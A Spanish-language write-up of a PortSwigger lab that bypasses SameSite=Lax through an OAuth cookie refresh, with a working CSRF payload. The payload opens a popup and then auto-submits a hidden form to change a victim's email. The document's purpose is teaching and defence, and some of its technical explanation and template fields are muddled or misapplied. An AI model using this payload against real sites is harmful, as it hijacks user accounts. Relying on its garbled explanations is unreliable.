---
title: "SameSite Lax bypass via cookie refresh"
platform: "PortSwigger"
os: "Windows"
difficulty: "Hard"
ip: "10.10.10.XXX"
slug: "samesite-lax-bypass-via-cookie-refresh"
author: "Z4k7"
date: "2026-04-04"
year: "2026"
status: "pwned"
tags:
  - "SameSite"
  - "CSRF"
techniques:
  - "SameSite Lax Bypass"
  - "Cookie Refresh"
  - "window.open()"
  - "OAuth Flow Exploitation"
tools:
  - "BurpSuite"
  - "Exploit Server"
  - "OAuth"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Lab de BurpSuite Academy sobre un ataque CSRF contra SameSite Lax usando 'cookie refresh'. La aplicación usa OAuth para autenticación y genera cookies con SameSite=Lax (por defecto en Chrome). SameSite Lax permite envío de cookies en navegaciones de nivel superior (como hacer clic en enlaces). El atacante explota esto usando window.open() para abrir el flujo OAuth, que crea una sesión válida. Luego, dentro de 2 minutos, ejecuta un CSRF POST que obtiene la cookie (porque fue refrescada por la navegación de nivel superior). Demuestra por qué SameSite Lax es insuficiente contra CSRF en contextos con OAuth.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          La función de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Para resolver el laboratorio, realiza un ataque CSRF que modifique la dirección de correo electrónico de la víctima. Debes utilizar el servidor de explotación proporcionado para alojar tu ataque.
          El laboratorio admite el inicio de sesión basado en OAuth. Puedes iniciar sesión a través de tu cuenta de redes sociales con las siguientes credenciales: `wiener:peter`
      - kind: "callout"
        type: "info"
        label: "Nota sobre SameSite"
        text: "Las restricciones predeterminadas de SameSite varían según el navegador. Dado que la víctima usa Chrome, recomendamos usar también Chrome (o el navegador Chromium integrado de Burp) para probar el exploit."

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260409190312805.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez estemos logiados en la web ya contamos con información del usuario actual:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260410234954864.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260410235002624.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260410235022026.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260410235031974.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260410235043719.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260409190428114.jpg"
        caption: "Evidencia técnica"
      - kind: "bullet"
        text: "Acceso a URL del laboratorio exitoso"
      - kind: "bullet"
        text: "Login basado en OAuth"
      - kind: "bullet"
        text: "Usuario autenticado con sesión activa"
      - kind: "bullet"
        text: "Acceso a sección de cambio de email"
      - kind: "note"
        text: |
          Consultamos el comportamiento del funcionamiento del login de la web:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260410213235262.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Para poder ingresar en la web se aplica una serie de cascadas de solicitudes para llegar a usuario con sesión activa. Se aplican desde redirecciones hasta una aceptación por parte del usuario.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este lab es diferente — no es autenticación tradicional. Es OAuth con una cascada de cookies y redirecciones. Pregúntate: ¿qué cookies se generan en cada paso? ¿Cuál tiene SameSite=Lax? ¿Cuál se reutiliza?"

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Vamos a consultar el comportamiento para acceder en el apartado de cambio de email:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260410230839504.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Consultando el apartado de cambio de email si tratamos de enviar un cambio de correo el sistema nos realiza el siguiente comportamiento:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260410231001701.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ciclo de gestión de sesión OAuth:
          1. `/social-login` — Inicia flujo OAuth
          - Redirige a `/auth?`
          - Crea cookie: `Set-Cookie: session=5Fc0GoncMbYSKZkTkBdzUGaUphZbVDl6; Expires=Sun, 12 Apr 2026 04:09:28 UTC; Secure; HttpOnly`
          2. `/auth?` — Validación OAuth
          - Asigna sesión adicional: `Set-Cookie: _session=Dr5kQyu7eaTIQLpc06xeB; path=/; expires=Sat, 25 Apr 2026 04:09:32 GMT; samesite=none; secure; httponly`
          - También: `Set-Cookie: _session.legacy=Dr5kQyu7eaTIQLpc06xeB; path=/; expires=Sat, 25 Apr 2026 04:09:32 GMT; secure; httponly`
          - Estas cookies sirven como medida para prevenir reutilización
          - Redirige a `/oauth-callback`
          3. `/oauth-callback` — Validación humana
          - Solicita interacción usuario (CAPTCHA o verificación)
          - Recupera la sesión creada en `/social-login`
          - Redirige a la página principal
          Características críticas:
      - kind: "bullet"
        text: "La cookie de /social-login se REUTILIZA en /oauth-callback"
      - kind: "bullet"
        text: "La cookie de /auth? es ÚNICA y no se reutiliza"
      - kind: "bullet"
        text: "La sesión tiene duración de 2 minutos"
      - kind: "bullet"
        text: "SameSite probablemente en Lax (por defecto en Chrome)"
      - kind: "callout"
        type: "warning"
        label: "SameSite Lax + OAuth Vulnerability"
        text: "SameSite Lax permite envío de cookies en navegaciones de nivel superior iniciadas por el usuario. `window.open()` es considerado navegación de nivel superior. Por lo tanto, cuando se abre `/social-login` vía `window.open()`, la cookie se envía. Esto permite al atacante: 1. Refrescar la sesión OAuth abriendo `/social-login` 2. Dentro de 2 minutos, ejecutar CSRF POST 3. La cookie está fresquecita y se envía (fue refrescada por nivel superior)"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este bypass es SOFISTICADO porque combina dos conceptos: - SameSite Lax (permite navegaciones de nivel superior) - OAuth cookie refresh (abrir login fresquecita la sesión)  El servidor asume que si la cookie fue refrescada por navegación de nivel superior = usuario real. PERO ese 'nivel superior' fue abierto por JavaScript malicioso."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          El problema es que un CSRF POST directo NO envía la cookie (SameSite=Lax rechaza POST cross-site). Pero si PRIMERO abrimos `/social-login` vía `window.open()`, eso SÍ es navegación de nivel superior, y la cookie se envía.
          Primer intento — CSRF POST simple (falla):
      - kind: "code"
        lang: "JS"
        code: |
          <form method="POST" action="https://0af200730457399080471c14009700a6.web-security-academy.net/change-email">
              <input type="hidden" name="email" value="pwned@web-security-academy.net">
          </form>
          <script>
              document.forms[0].submit();
          </script>
      - kind: "note"
        text: |
          Sin la cookie, no funciona. Pero si PRIMERO refrescamos la sesión con `window.open()`:
      - kind: "code"
        lang: "JS"
        code: |
          <form method="POST" action="https://0af200730457399080471c14009700a6.web-security-academy.net/change-email">
              <input type="hidden" name="email" value="pwned@web-security-academy.net">
          </form>
          <p>Click anywhere on the page</p>
          <script>
              window.onclick = () => {
                  window.open('https://0af200730457399080471c14009700a6.web-security-academy.net/social-login');
                  setTimeout(changeEmail, 5000);
              }
              
              function changeEmail(){
                  document.forms[0].submit();
              }
          </script>
      - kind: "note"
        text: |
          Desglose del ataque:
          1. `window.onclick` — Espera interacción del usuario (evita bloqueo de popups)
          2. `window.open('/social-login')` — Abre OAuth flow en popup
          - Esto es navegación de nivel superior
          - SameSite Lax permite envío de cookies aquí
          - Las cookies se refresco/renuevan
          3. `setTimeout(changeEmail, 5000)` — Espera 5 segundos (tiempo para que OAuth complete)
          4. `document.forms[0].submit()` — Envía CSRF POST
          - Ahora la cookie está fresca (fue renovada por navegación de nivel superior)
          - El navegador envía la cookie incluso en contexto cross-site porque fue actualizada recientemente
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260410235422915.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260410235944040.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260411000746947.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez ingrese la ventana emergente se genera la sesión y se crea el cambio de email.
      - kind: "callout"
        type: "info"
        label: "Anatomía del Bypass — Cookie Refresh + SameSite Lax"
        text: "1. Atacante prepara formulario POST oculto 2. Espera click del usuario 3. Abre `/social-login` en popup (navegación de nivel superior) 4. Chrome: 'esto es nivel superior' → envía/refresca cookies 5. Espera 5 segundos (OAuth completa) 6. Envía CSRF POST 7. Chrome: 'cookies fueron refrescadas recientemente por nivel superior' → las envía 8. Servidor: 'hay cookies, hay email, ¿por qué no cambiar?' 9. Email cambiado ✅"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este bypass es elegante porque NO requiere romper SameSite. Requiere ENTENDER cómo funciona SameSite Lax: - Lax = envía cookies en navegaciones de nivel superior - El atacante abre un 'nivel superior' (popup) - Las cookies se refresco - Luego CSRF se ejecuta usando esa cookie fresca  Es como decir: 'SameSite Lax confía en navegaciones de nivel superior. Yo crearé una navegación de nivel superior maliciosa.'"

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Ingresamos en el apartado de `Go to Exploit Server` para simular un servidor atacante:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260411000932080.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez se cargue el código arbitrario se guarda en el servidor y se envía a la víctima:
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260411001406262.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/SameSite%20Lax%20bypass%20via%20cookie%20refresh/file-20260411001422096.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este lab marca la transición de CSRF tradicional a CSRF moderno. No es un error del token — es un error de cómo el navegador maneja cookies. SameSite Lax confía en navegaciones de nivel superior. El atacante crea una falsa."

  - id: "privesc_1"
    num: "06"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          Este lab no aplica escalada de privilegios, pero demuestra cómo funciones legítimas del navegador pueden ser abusadas.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "`window.open()` es legítima. OAuth es legítimo. Pero su combinación contra SameSite Lax es vulnerable. Es como usar un arma legítima para romper una cerradura."

lessons:
  - 'SameSite Lax confía en navegaciones de nivel superior: Pero "nivel superior" puede ser creado por JavaScript malicioso.'
  - 'Cookie refresh via `window.open()` es poderoso: Permite renovar cookies desde contexto cross-site si es "nivel superior".'
  - 'SameSite Lax es mejor que None, pero NO es suficiente: Lax confía demasiado en navegaciones de nivel superior.'
  - 'OAuth + SameSite Lax = vulnerable a este patrón: Si el flujo OAuth crea cookies reutilizables.'
  - 'El timing es crítico: El atacante debe esperar a que OAuth complete antes de ejecutar CSRF.'
  - 'SameSite Strict habría prevenido esto: Porque no envía cookies en NINGÚN contexto cross-site.'
mitigation:
  - 'Usar SameSite=Strict en cookies críticas: Si es posible (aunque rompe algunos flujos OAuth).'
  - 'Incluir CSRF tokens incluso con SameSite: Defensa en profundidad.'
  - 'Validar Referer en cambios críticos: Detectar `window.open()` desde dominios externos.'
  - 'Usar anti-CSRF tokens con timeout corto: Renovarlos frecuentemente.'
  - 'Implementar detección de abusos: Si `/social-login` se abre en popup → loguear/alertar.'
  - 'Content Security Policy: Para limitar `window.open()`.'
---
